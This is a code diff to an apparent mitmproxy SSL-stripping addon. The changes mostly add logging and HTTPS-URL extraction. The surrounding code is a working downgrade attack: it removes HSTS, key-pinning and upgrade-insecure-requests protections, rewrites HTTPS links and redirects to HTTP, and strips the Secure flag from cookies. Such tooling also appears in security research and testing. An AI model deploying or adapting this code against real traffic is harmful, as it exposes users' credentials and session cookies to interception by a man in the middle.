@@ -197,7 +197,9 @@ def request(flow: http.HTTPFlow) -> None:
     #    "debug")
 
     # do not force https redirection
-    flow.request.headers.pop('Upgrade-Insecure-Requests', None)
+    if flow.request.headers.pop('Upgrade-Insecure-Requests', None):
+        logging.info(
+            "SSLStrip - Removing header Upgrade-Insecure-Requests for %s" % flow.request.url)
 
     # proxy connections to SSL-enabled hosts
     if flow.request.pretty_host in secure_hosts:
@@ -210,25 +212,39 @@ def request(flow: http.HTTPFlow) -> None:
         flow.request.host = flow.request.pretty_host
 
 
+
 def response(flow: http.HTTPFlow) -> None:
     #flow.response.headers.pop('Strict-Transport-Security', None)
     #flow.response.headers.pop('Public-Key-Pins', None)
     #mitmproxy.ctx.log(
     #    "Response: %s" % repr(flow.response.content),
     #    "debug")
+    request_url = flow.request.url
     if flow.response.headers.pop('Strict-Transport-Security', None):
         #mitmproxy.ctx.log(
         logging.info(
-            "Removing header Strict-Transport-Security for %s" % (repr(flow.response)))
+            "SSLStrip - Removing header Strict-Transport-Security for %s" %
+            request_url)
     if flow.response.headers.pop('Public-Key-Pins', None):
         logging.info(
-            "Removing header Public-Key-Pins for %s:%s" % (repr(flow.response), repr(flow.response.port)))
+            "SSLStrip - Removing header Public-Key-Pins for %s:%s" % (request_url, repr(flow.response.port)))
 
 
     # strip links in response body
     if b'https://' in flow.response.content:
-        logging.info(
-            "Replacing content: %s" % repr(flow.response.content))
+        try:
+            # extract HTTPS URLs from the response body
+            https_urls = re.findall('https://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', repr(flow.response.content))
+            for https_url in https_urls:
+                if "." not in https_url:  # exclude URLs like https://ssl
+                    continue
+                logging.info(
+                    "SSLStrip - Will downgrade to HTTP %s %s" %
+                    (https_url, request_url))
+        except Exception:
+            logging.exception(
+                "Error while extracting HTTPS links %s" % request_url)
+
     flow.response.content = flow.response.content.replace(b'https://', b'http://')
 
     # strip meta tag upgrade-insecure-requests in response body
@@ -243,12 +259,16 @@ def response(flow: http.HTTPFlow) -> None:
             secure_hosts.add(hostname)
             logging.info(
             "Secure Host added: %s" % hostname)
+        logging.info("SSLStrip - Will downgrade Location header to HTTP %s %s" % (location, request_url))
         flow.response.headers['Location'] = location.replace('https://', 'http://', 1)
+
 
     # strip upgrade-insecure-requests in Content-Security-Policy header
     if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
         logging.info(
-            "upgrade-insecure-requests: %s" % repr(flow.response.headers.get('Content-Security-Policy', '')))
+            "SSLStrip - upgrade-insecure-requests: %s %s" %
+            (repr(flow.response.headers.get('Content-Security-Policy', '')),
+             request_url))
         csp = flow.response.headers['Content-Security-Policy']
         flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
         mitmproxy.ctx.log("Removing upgrade-insecure-requests for %s:%s" % (repr(flow.response.host),repr(flow.response.port)), "warn")
@@ -258,7 +278,8 @@ def response(flow: http.HTTPFlow) -> None:
     if cookies:
         for s in cookies:
             if "secure" in s:
-                logging.info("Stripping Secure Cookie: %s" % repr(s))
+                logging.info("SSLStrip - Stripping Secure Cookie: %s %s" %
+                             (repr(s), request_url))
     cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
     flow.response.headers.set_all('Set-Cookie', cookies)
 
